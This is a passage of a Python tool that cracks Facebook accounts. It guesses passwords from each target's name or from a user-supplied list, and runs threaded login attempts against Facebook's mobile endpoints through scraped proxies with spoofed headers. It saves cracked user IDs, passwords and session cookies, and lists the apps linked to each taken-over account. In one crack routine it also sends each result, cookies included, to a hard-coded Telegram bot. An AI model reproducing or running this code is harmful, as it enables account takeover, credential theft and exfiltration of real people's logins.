	urut.append(Panel(f"{P2}[{color_rich}01{P2}]. id old to new",width=24,style=f"{color_table}"))
	urut.append(Panel(f"{P2}[{color_rich}02{P2}]. id new to old",width=24,style=f"{color_table}"))
	urut.append(Panel(f"{P2}[{color_rich}03{P2}]. id random",width=25,style=f"{color_table}"))
	console.print(Columns(urut))
	ask = input(f" {N}choose your choice : ")
	if ask in["1"]:
		id.sort()
		for urutan in id:
			id2.append(urutan)
	elif ask in["2"]:
		for urutan in id:
			id2.insert(0,urutan)
	elif ask in["3"]:
		for urutan in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,urutan)

def manual(id):
	prints(Panel(f"""{P2}create a many password using a comma (,) as a separator""",width=80,style=f"{color_table}"))
	pwx = input(f" {N}create password : ")
	if len(pwx)<=5:
		prints(Panel(f"""{P2}please create a password with at least 6 letters or more""",width=80,style=f"{color_table}"))
		sys.exit()
	aturutuan(id)
	prints(Panel(f"""{P2}if it appears will make the crack process slower, recommended select n""",width=80,style=f"{color_table}"))
	apli = input(f" {N}do you want to show applications when crack?[y/n] : ")
	if apli in["Y","y"]:
		apk.append("show")
	else:
		pass
	azxc.append(Panel(f"""{P2}[{color_rich}01{P2}]. metode freefb
[{color_rich}02{P2}]. metode mbasic
[{color_rich}03{P2}]. metode mobile""",width=37,title=f"{P2}metode reguler",style=f"{color_table}"))
	azxc.append(Panel(f"""{P2}[{color_rich}04{P2}]. metode freefb
[{color_rich}05{P2}]. metode mbasic
[{color_rich}06{P2}]. metode mobile""",width=37,title=f"{P2}metode validate",style=f"{color_table}"))
	console.print(Columns(azxc))
	log = input(f" {N}choose your url login : ")
	if log in["1","01"]:
		mtd_dev.append("free")
		setting_proxy()
		manual_reguler(pwx)
	elif log in["2","02"]:
		mtd_dev.append("mbasic")
		setting_proxy()
		manual_reguler(pwx)
	elif log in["3","03"]:
		mtd_dev.append("mobile")
		setting_proxy()
		manual_reguler(pwx)
	elif log in["4","04"]:
		mtd_dev.append("free")
		setting_proxy()
		manual_validate(pwx)
	elif log in["5","05"]:
		mtd_dev.append("mbasic")
		setting_proxy()
		manual_validate(pwx)
	elif log in["6","06"]:
		mtd_dev.append("mobile")
		setting_proxy()
		manual_validate(pwx)

###----------[ PASSWORD OTOMATIS ]---------- ###
def otomatis(id):
	aturutuan(id)
	prints(Panel(f"""{P2}if it appears will make the crack process slower, recommended select n""",width=80,style=f"{color_table}"))
	apli = input(f" {N}do you want to show applications when crack?[y/n] : ")
	if apli in["Y","y"]:
		apk.append("show")
	else:
		pass
	azxc.append(Panel(f"""{P2}[{color_rich}01{P2}]. metode freefb
[{color_rich}02{P2}]. metode mbasic
[{color_rich}03{P2}]. metode mobile""",width=37,title=f"{P2}metode reguler",style=f"{color_table}"))
	azxc.append(Panel(f"""{P2}[{color_rich}04{P2}]. metode freefb
[{color_rich}05{P2}]. metode mbasic
[{color_rich}06{P2}]. metode mobile""",width=37,title=f"{P2}metode validate",style=f"{color_table}"))
	console.print(Columns(azxc))
	log = input(f" {N}choose your url login : ")
	if log in["1","01"]:
		mtd_dev.append("free")
		setting_proxy()
		otomatis_reguler()
	elif log in["2","02"]:
		mtd_dev.append("mbasic")
		setting_proxy()
		otomatis_reguler()
	elif log in["3","03"]:
		mtd_dev.append("mobile")
		setting_proxy()
		otomatis_reguler()
	elif log in["4","04"]:
		mtd_dev.append("free")
		setting_proxy()
		otomatis_validate()
	elif log in["5","05"]:
		mtd_dev.append("mbasic")
		setting_proxy()
		otomatis_validate()
	elif log in["6","06"]:
		mtd_dev.append("mobile")
		setting_proxy()
		otomatis_validate()
	
def setting_proxy(): #graha
	prints(Panel(f"""{P2}if you choose n it will use the previous proxy that already exists""",width=80,style=f"{color_table}"))
	pr = input(f" {N}do you want to use the latest proxy?[y/n] : ")
	if pr in["y","Y"]:
		try:
			url = ses.get('https://api.proxyscrape.com/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all').text
			open("data/proxy.txt","w").write(url)
		except:pass
	else:
		pass

###----------[ GENERATE PASSWORD MANUAL ]---------- ###
def manual_reguler(pwz):
	global prog,des
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'),TimeElapsedColumn())
	des = prog.add_task('',total=len(id2))
	with prog:
		with ThreadPoolExecutor(max_workers=30) as fall:
			saveresulst()
			for user in id2:
				try:
					pwx = []
					uid  = user.split("<=>")[0]
					name = user.split("<=>")[1]
					for z in pwz.split(","):
						pwx.append(z)
					if "free" in mtd_dev:
						fall.submit(metode_reguler,uid,pwx,"free.facebook.com")
					elif "mbasic" in mtd_dev:
						fall.submit(metode_reguler,uid,pwx,"mbasic.facebook.com")
					elif "mobile" in mtd_dev:
						fall.submit(metode_reguler,uid,pwx,"m.facebook.com")
				except Exception as e:
					if "free" in mtd_dev:
						fall.submit(metode_reguler,uid,pwx,"free.facebook.com")
					elif "mbasic" in mtd_dev:
						fall.submit(metode_reguler,uid,pwx,"mbasic.facebook.com")
					elif "mobile" in mtd_dev:
						fall.submit(metode_reguler,uid,pwx,"m.facebook.com")
	prints(Panel(f"""{P2}successfully cracked {len(id2)} id, with result OK : {H2}{len(ok)}{P2} CP : {K2}{len(cp)}{P2}""",width=80,padding=(0,8),style=f"{color_table}"))
	sys.exit()
	
def manual_validate(pwz):
	global prog,des
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'),TimeElapsedColumn())
	des = prog.add_task('',total=len(id2))
	with prog:
		with ThreadPoolExecutor(max_workers=30) as fall:
			saveresulst()
			for user in id2:
				try:
					pwx = []
					uid  = user.split("<=>")[0]
					name = user.split("<=>")[1]
					for z in pwz.split(","):
						pwx.append(z)
					if "free" in mtd_dev:
						fall.submit(metode_validate,uid,pwx,"free.facebook.com")
					elif "mbasic" in mtd_dev:
						fall.submit(metode_validate,uid,pwx,"mbasic.facebook.com")
					elif "mobile" in mtd_dev:
						fall.submit(metode_validate,uid,pwx,"m.facebook.com")
				except Exception as e:
					if "free" in mtd_dev:
						fall.submit(metode_validate,uid,pwx,"free.facebook.com")
					elif "mbasic" in mtd_dev:
						fall.submit(metode_validate,uid,pwx,"mbasic.facebook.com")
					elif "mobile" in mtd_dev:
						fall.submit(metode_validate,uid,pwx,"x.facebook.com")
	prints(Panel(f"""{P2}successfully cracked {len(id2)} id, with result OK : {H2}{len(ok)}{P2} CP : {K2}{len(cp)}{P2}""",width=80,padding=(0,8),style=f"{color_table}"))
	sys.exit()

###----------[ GENERATE PASSWORD OTOMATIS ]----------###
def otomatis_reguler():
	global prog,des
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'),TimeElapsedColumn())
	des = prog.add_task('',total=len(id2))
	with prog:
		with ThreadPoolExecutor(max_workers=30) as fall:
			saveresulst()
			for user in id2:
				try:
					pwx = []
					uid,nama = user.split('<=>')[0],user.split('<=>')[1].lower()
					depan = nama.split(" ")[0]
					if len(nama)<=5:
						if len(depan)<3:
							pass 
						else:
							pwx.append(depan+"123")
							pwx.append(depan+"12345")
					else:
						if len(depan)<3:
							pwx.append(nama)
						else:
							pwx.append(nama)
							pwx.append(depan+"123")
							pwx.append(depan+"12345")
					if "free" in mtd_dev:
						fall.submit(metode_reguler,uid,pwx,"free.facebook.com")
					elif "mbasic" in mtd_dev:
						fall.submit(metode_reguler,uid,pwx,"mbasic.facebook.com")
					elif "mobile" in mtd_dev:
						fall.submit(metode_reguler,uid,pwx,"m.facebook.com")
				except Exception as e:
					if "free" in mtd_dev:
						fall.submit(metode_reguler,uid,pwx,"free.facebook.com")
					elif "mbasic" in mtd_dev:
						fall.submit(metode_reguler,uid,pwx,"mbasic.facebook.com")
					elif "mobile" in mtd_dev:
						fall.submit(metode_reguler,uid,pwx,"x.facebook.com")
	prints(Panel(f"""{P2}successfully cracked {len(id2)} id, with result OK : {H2}{len(ok)}{P2} CP : {K2}{len(cp)}{P2}""",width=80,padding=(0,8),style=f"{color_table}"))
	sys.exit()
	
def otomatis_validate():
	global prog,des
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'),TimeElapsedColumn())
	des = prog.add_task('',total=len(id2))
	with prog:
		with ThreadPoolExecutor(max_workers=30) as fall:
			saveresulst()
			for user in id2:
				try:
					pwx = []
					uid,nama = user.split('<=>')[0],user.split('<=>')[1].lower()
					depan = nama.split(" ")[0]
					if len(nama)<=5:
						if len(depan)<3:
							pass 
						else:
							pwx.append(depan+"123")
							pwx.append(depan+"12345")
					else:
						if len(depan)<3:
							pwx.append(nama)
						else:
							pwx.append(nama)
							pwx.append(depan+"123")
							pwx.append(depan+"12345")
					if "free" in mtd_dev:
						fall.submit(metode_validate,uid,pwx,"free.facebook.com")
					elif "mbasic" in mtd_dev:
						fall.submit(metode_validate,uid,pwx,"mbasic.facebook.com")
					elif "mobile" in mtd_dev:
						fall.submit(metode_validate,uid,pwx,"m.facebook.com")
				except Exception as e:
					if "free" in mtd_dev:
						fall.submit(metode_validate,uid,pwx,"free.facebook.com")
					elif "mbasic" in mtd_dev:
						fall.submit(metode_validate,uid,pwx,"mbasic.facebook.com")
					elif "mobile" in mtd_dev:
						fall.submit(metode_validate,uid,pwx,"x.facebook.com")
	prints(Panel(f"""{P2}successfully cracked {len(id2)} id, with result OK : {H2}{len(ok)}{P2} CP : {K2}{len(cp)}{P2}""",width=80,padding=(0,8),style=f"{color_table}"))
	sys.exit()
    
###----------[ METODE CRACK ]---------- ###
def metode_reguler(user, pwx, url):
	global ok,cp,loop
	redmi = open('data/fb1_000003.txt','r').read().splitlines()
	ua = random.choice(redmi)
	nokia = open('data/ugent.txt','r').read().splitlines()
	ua2 = random.choice(nokia)
	prox = open("data/proxy.txt","r").read().splitlines()
	prog.update(des,description=f"crack {str(loop)}/{len(id2)} OK : {H}{len(ok)}{N} CP : {K}{len(cp)}{N}")
	prog.advance(des)
	for pw in pwx:
		try:
			pw = pw.lower()
			ses=requests.Session()
			proxy= {"http": "socks5://{random.choice(prox)}"}
			headers1= {
				"Host":url,
				"upgrade-insecure-requests":"1",
				"user-agent":'Mozilla/5.0 (Android 10; Mobile; rv:91.0) Gecko/91.0 Firefox/91.0',
				"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1",
				"x-requested-with":"com.facebook.katana",
				"sec-fetch-site":"same-origin",
				"sec-fetch-mode":"cors",
				"sec-fetch-user":"empty",
				"sec-fetch-dest":"document",
				"referer":f"https://{url}/",
				"accept-encoding":"gzip, deflate br",
				"accept-language":"en-GB,en-US;q=0.9,en;q=0.8"
				}
			p = ses.get(f"https://{url}/login/?next&ref=dbl&fl&refid=8",headers=headers1)
			data = {
				"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
				"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
				"email":user,
				"pass":pw
				}
			#cookie = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			#cookie += " m_pixel_ratio=2.625; wd=412x756"
			headers2 = {
				"Host": url,
				"cache-control":"max-age=0",
				"upgrade-insecure-requests":"1",
				"origin":f"https://{url}",
				"content-type":"application/x-www-form-urlencoded",
				"user-agent":'Mozilla/5.0 (Android 10; Mobile; rv:91.0) Gecko/91.0 Firefox/91.0',
				"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
				"x-requested-with":"com.facebook.katana",
				"sec-fetch-site":"same-origin",
				"sec-fetch-mode":"cors",
				"sec-fetch-user":"empty",
				"sec-fetch-dest":"document",
				'referer':f'https://{url}/login/?next&ref=dbl&fl&refid=8',
				"accept-encoding":"gzip, deflate br",
				"accept-language":"en-GB,en-US;q=0.9,en;q=0.8"
				}
			po = ses.post(f"https://{url}/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data, headers=headers2, proxies=proxy)
			if "c_user" in ses.cookies.get_dict():
				ok.append("%s|%s"%(user, pw))
				coki = convert(ses.cookies.get_dict())
				user = re.findall('c_user=(.*);xs', coki)[0]
				if "show" in apk:
					get_apk(user,pw,coki)
				else:
					tree = Tree('',guide_style='green')
					tree.add("[italic bold green]RESULTS[/]").add(f"[bold green]{user}[white]|[bold green]{pw}[/]")
					tree.add(f"[bold green]{coki}[/]")
					prints(tree)
					os.popen('play-audio data/anjas_kelas.mp3')
					requests.post(f"https://api.telegram.org/bot5819386661:AAEkKYzT2otIzxxJy45z0liI1MrjPq2lvew/sendMessage?chat_id=5098224938&text=SUCCESSFUL : {sim_ok}\nTAHUN AKUN : {tahunng(idf)}\nUSER : {user}\nPASS : {pw}\nCOOKIE : {coki}")
				open("OK/%s.txt"%(date_now),"a").write("  * --> %s|%s|%s\n"%(user, pw,coki))
				break
			elif "checkpoint" in ses.cookies.get_dict():
				user = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				cp.append("%s|%s"%(user, pw))
				tree = Tree('',guide_style='yellow')
				tree.add(f"{K}RESULTS{P}").add(f"\r{K}{user}|{pw}{P} ").add(f"{J2}{ua}{P}")
				prints(tree)
				os.popen('play-audio data/dosa_pantek.mp3')
				requests.post(f"https://api.telegram.org/bot5819386661:AAEkKYzT2otIzxxJy45z0liI1MrjPq2lvew/sendMessage?chat_id=5098224938&text=CHECKPOINT : {sim_cp}\nTAHUN AKUN : {tahunng(idf)}\nUSER : {user}\nPASS : {pw}\nUGENT : {ua}")
				open("CP/%s.txt"%(date_now),"a").write("  * --> %s|%s\n"%(user, pw))
				break
		except requests.exceptions.ConnectionError:
			sleep(32)

	loop+=1
	
def metode_validate(user, pwx, url):
	global ok,cp,loop
	ua = random.choice(tutu)
	prox = open("data/proxy.txt","r").read().splitlines()
	prog.update(des,description=f"KR-TEAM {str(loop)}/{len(id2)} OK : {H}{len(ok)}{N} CP : {K}{len(cp)}{N}")
	prog.advance(des)
	for pw in pwx:
		try:
			pw = pw.lower()
			ses=requests.Session()
			proxy= {"http": "socks5://{random.choice(prox)}"}
			headers1= {
				"Host": url,
				"cache-control": "max-age=0",
				"user-agent": ua,
				"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
				"sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="105", "Google Chrome";v="74"',
				"sec-ch-ua-mobile": "?1",
				"sec-fetch-site": "same-origin",
				"sec-fetch-mode": "cors",
				"sec-fetch-dest": "empty",
				"sec-fetch-user": "?1",
				"upgrade-insecure-requests": "1",
				"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			p = ses.get(f"https://{url}/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F",headers=headers1)
			data = {
				"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
				"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
				"uid":user,
				"next":f"https://{url}/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified",
				"pass":pw,
				"flow":"login_no_pin"}
			cookie = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			cookie += " m_pixel_ratio=2.625; wd=412x756"
			headers2 = {
				"Host": url,
				"connection": "keep-alive",
				"cache-control": "max-age=0",
				"save-data": "on",
				"origin": "{url}",
				"content-type": "application/x-www-form-urlencoded",
				"user-agent": ua,
				"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
				"x-requested-with": "com.facebook.adsmanager",
				"dnt": "1",
				"sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="101"',
				"sec-ch-ua-platform": '"Android"',
				"sec-ch-ua-mobile": "?1",
				"sec-fetch-site": "same-origin",
				"sec-fetch-mode": "cors",
				"sec-fetch-dest": "empty",
				"sec-fetch-user": "?1",
				"upgrade-insecure-requests": "1",
				"referer": f"https://{url}/login.php?skip_api_login=1&api_key=322935469656730&kid_directed_site=0&app_id=322935469656730&signed_next=1&next=https://{url}/dialog/oauth?client_id=322935469656730&redirect_uri=https%3A%2F%2Fauth.meta.com%2Flogin%2Ffacebook%2Fresponse%2F%3Fstate%3DATD5nHC4edOMoAzC8J17lYNyHSaLUR2HV5zxWLj0OjpodHV6r6u1_gCAISpijfm0EFoQUtn16BBW8Ah2aCj5H-X0CqVofDKDRqent4fe7YA50B-ui6Mq7kTGmIp_j1U5triydjrynmOXjAhTHJR5SSfBL30-ua5TBgcJtlRgULcIHPOohSl0sQUgpvsMzAUZbSzoholY9NsYWIckn9Bq_3qfn4mtCqfPBIMJqzmPv7Qv0WacvuLDiJMhce4-3JjE8FE9m3H-nKlFSSDGVyhCTxUN0PCgiCIq1yyJhuKqlNx4aUb2kKZuPrMm4545MVT2e580DRuJYeeGuR8RqxrJ8XgtPViKGnd7XFO48NO6XhIivpaogF9BpRvn1FzNZMnVCSBZ0qI4aquNupeiwZ0ItZFVhSf2KqKkHInuvpCJ4PwZtbnRPR9jk3ZnFFb3M9puqmB47R1RaWz2y-icx8T0kiwGk-SEMtU9T3wWoxa2BbobbQL3GBt09IW2oQRiLHcb7LiYxFQoiiiroczxA4WwFrXsS2D0Hl_ZrpB5aLA-rgW080lvxV8iEYO61gj1xTMpqXF5zKz9VjE_qL0TQzK5bgaMJpywnt8TMFte0GU5C-nnDrtJQrMsVH6vMGHi0zqbtT51Cotl9FIfm9GE3Czegn7Hmrms0uDqxnFpQc0CuDs&response_type=code&scope=public_profile%2Cemail%2Cuser_birthday&ret=login&fbapp_pres=0&logger_id=74e8cf7e-d665-4088-9570-0eb586cc4ed4&tp=unspecified&cancel_url=https://auth.meta.com/login/facebook/response/?state=ATD5nHC4edOMoAzC8J17lYNyHSaLUR2HV5zxWLj0OjpodHV6r6u1_gCAISpijfm0EFoQUtn16BBW8Ah2aCj5H-X0CqVofDKDRqent4fe7YA50B-ui6Mq7kTGmIp_j1U5triydjrynmOXjAhTHJR5SSfBL30-ua5TBgcJtlRgULcIHPOohSl0sQUgpvsMzAUZbSzoholY9NsYWIckn9Bq_3qfn4mtCqfPBIMJqzmPv7Qv0WacvuLDiJMhce4-3JjE8FE9m3H-nKlFSSDGVyhCTxUN0PCgiCIq1yyJhuKqlNx4aUb2kKZuPrMm4545MVT2e580DRuJYeeGuR8RqxrJ8XgtPViKGnd7XFO48NO6XhIivpaogF9BpRvn1FzNZMnVCSBZ0qI4aquNupeiwZ0ItZFVhSf2KqKkHInuvpCJ4PwZtbnRPR9jk3ZnFFb3M9puqmB47R1RaWz2y-icx8T0kiwGk-SEMtU9T3wWoxa2BbobbQL3GBt09IW2oQRiLHcb7LiYxFQoiiiroczxA4WwFrXsS2D0Hl_ZrpB5aLA-rgW080lvxV8iEYO61gj1xTMpqXF5zKz9VjE_qL0TQzK5bgaMJpywnt8TMFte0GU5C-nnDrtJQrMsVH6vMGHi0zqbtT51Cotl9FIfm9GE3Czegn7Hmrms0uDqxnFpQc0CuDs&error=access_denied&error_code=200&error_description=Permissions+error&error_reason=user_denied#_=_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr",
				"accept-encoding": "gzip, deflate, br",
				"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			po = ses.post(f"https://{url}/login/device-based/validate-password/?shbl=0&locale2=id_ID",data=data, headers=headers2, cookies={"cookie": cookie}, proxies=proxy, allow_redirects=False)
			if "c_user" in ses.cookies.get_dict():
				ok.append("%s|%s"%(user, pw))
				coki = convert(ses.cookies.get_dict())
				user = re.findall('c_user=(.*);xs', coki)[0]
				if "show" in apk:
					get_apk(user,pw,coki)
				else:
					tree = Tree("                                 ")
					tree.add(f"{H}RESULTS").add(f"\r{H}{user}|{pw}{P} ")
					tree.add(f"{H}{coki}{N}").add(f"{U2}{ua}{P}")
					prints(tree)
					os.popen('play-audio data/anjas_kelas.mp3')
				open("OK/%s.txt"%(date_now),"a").write("  * --> %s|%s|%s\n"%(user, pw,coki))
				break
			elif "checkpoint" in ses.cookies.get_dict():
				user = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				cp.append("%s|%s"%(user, pw))
				tree = Tree("                                 ")
				tree.add(f"{K}RESULTS{P}").add(f"\r{K}{user}|{pw}{P} ").add(f"{J2}{ua}{P}")
				prints(tree)
				os.popen('play-audio data/dosa_pantek.mp3')
				open("CP/%s.txt"%(date_now),"a").write("  * --> %s|%s\n"%(user, pw))
				break
		except requests.exceptions.ConnectionError:
			sleep(32)
	loop+=1
		
###----------[ CONVET LANGUAGE ]---------- ###
def language(cookie):
	try:
		url = ses.get('https://mbasic.facebook.com/language/',cookies=cookie)
		data = parser(url.text,'html.parser')
		for x in data.find_all('form',{'method':'post'}):
			if 'Bahasa Indonesia' in str(x):
				bahasa = {"fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(url.text)).group(1),"jazoest" : re.search('name="jazoest" value="(.*?)"', str(url.text)).group(1),"submit"  : "Bahasa Indonesia"}
				eksekusi = ses.post('https://mbasic.facebook.com' + x['action'],data=bahasa,cookies=cookie)
	except:pass

###----------[ GET APK FROM COOKIE ]---------- ###
def get_apk(user,pw,cok):
	cookie = {"cookie":cok}
	language(cookie)
	tree = Tree("                                 ")
	tree.add(f"\r{H}{user}|{pw}{N} ")
	tree.add(f"\r{H}{cok}{N}")
	try:
		active = Tree(f"\r{N}active application :")
		url = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=active"
		get_active(url,active,cookie)
	except Exception as e:
		print(e)
	try:
		inactive = Tree(f"\r{N}inactive application :")
		url = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive"
		get_inactive(url,inactive,cookie)
	except Exception as e:
		print(e)
	tree.add(active)
	tree.add(inactive)
	prints(tree)
		
###----------[ GET APK ACTIVE ]---------- ###
def get_active(url,active,cookie):
	try:
		data = parser(ses.get(url,cookies=cookie).text,"html.parser")
		for apk in data.find_all("h3"):
			if "Ditambahkan" in apk.text:
				active.add(f"\r{H}{str(apk.text).replace('Ditambahkan',' Ditambahkan')}{N}")
			else:continue
		next = "https://mbasic.facebook.com" + data.find("a",string="Lihat Lainnya")["href"]
		get_active(next,active,cookie)
	except:pass

###----------[ GET APK INACTIVE ]---------- ###
def get_inactive(url,inactive,cookie):
	try:
		data = parser(ses.get(url,cookies=cookie).text,"html.parser")
		for apk in data.find_all("h3"):
			if "Kedaluwarsa" in apk.text:
				inactive.add(f"\r{M}{str(apk.text).replace('Kedaluwarsa',' Kedaluwarsa')}{N}")
			else:continue
		next = "https://mbasic.facebook.com" + data.find("a",string="Lihat Lainnya")["href"]
		get_inactive(next,inactive,cookie)
	except:pass

###----------[ CONVERT COOKIE ]---------- ###
def convert(cookie):
	cok = ('sb=%s;datr=%s;c_user=%s;xs=%s;fr=%s'%(cookie['sb'],cookie['datr'],cookie['c_user'],cookie['xs'],cookie['fr']))
	return(str(cok))
	
###----------[ PRINT SAVE RESULTS ]---------- ###
def saveresulst():
	prints(Panel(f"""\r{P2}results acoount ok saved to : {date_now}
results acoount cp saved to : {date_now}""",width=80,padding=(0,10),style=f"{color_table}"))
